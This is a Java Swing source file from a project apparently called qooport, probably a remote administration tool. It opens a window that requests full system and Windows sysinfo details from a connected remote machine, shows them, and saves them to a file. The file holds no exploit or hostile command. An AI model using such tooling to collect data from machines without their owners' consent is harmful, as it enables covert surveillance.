package qooport.modulos;

import java.awt.BorderLayout;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JToolBar;
import qooport.asociado.Asociado;
import qooport.utilidades.Util;

public class Informacion extends JFrame {

    private Asociado servidor;
    public JTextArea txtInfo;

    public Informacion(Asociado servidor) {
        initComponents();
        this.servidor = servidor;
        btnPedirInfo(null);
    }

    private void initComponents() {

        /////////////////////////////////////////////
//                TABLE DE INFORMACION
        /////////////////////////////////////////////
        JPanel panel = new JPanel();
        JToolBar b1 = new JToolBar();
        b1.setFloatable(false);
        JScrollPane jScrollPane1;
        jScrollPane1 = new JScrollPane();
        JButton btnInfo = new JButton();
        btnInfo.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnInfo.setVisible(true);
        btnInfo.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Informacion.this.btnPedirInfo(evt);
            }
        });
        b1.add(btnInfo);
        JButton btnInfoSysInfo = new JButton();
        btnInfoSysInfo.setIcon(Util.cargarIcono16("/resources/information-button.png"));
        btnInfoSysInfo.setVisible(true);
        btnInfoSysInfo.setText("SysInfo (windows)");
        btnInfoSysInfo.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Informacion.this.btnPedirInfoSysInfo(evt);
            }
        });
        b1.add(btnInfoSysInfo);

        JButton btnGuardar = new JButton();
        btnGuardar.setIcon(Util.cargarIcono16("/resources/save.png"));
        btnGuardar.setVisible(true);
        btnGuardar.setText("Guardar");
        btnGuardar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Util.guardarTexto(txtInfo.getText());
            }
        });
        b1.add(btnGuardar);

        txtInfo = new JTextArea();
        txtInfo.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 11));

        jScrollPane1.setViewportView(this.txtInfo);
        panel.setLayout(new BorderLayout());
        panel.add(jScrollPane1, BorderLayout.CENTER);
        panel.add(b1, BorderLayout.SOUTH);

        this.setLayout(new BorderLayout());
//        this.add(barra, BorderLayout.NORTH);
        this.add(panel, BorderLayout.CENTER);
        this.setIconImage(Util.cargarIcono16("/resources/info.png").getImage());
        this.setSize(600, 450);
        this.setResizable(true);
        this.setVisible(true);

        pack();

    }

    private void btnPedirInfo(ActionEvent evt) {
        txtInfo.setText("Solicitando información...");
        servidor.pedirInfoCompleta();
    }

    private void btnPedirInfoSysInfo(ActionEvent evt) {
        txtInfo.setText("Solicitando información...");
        servidor.pedirInfoSysInfo();
    }

}
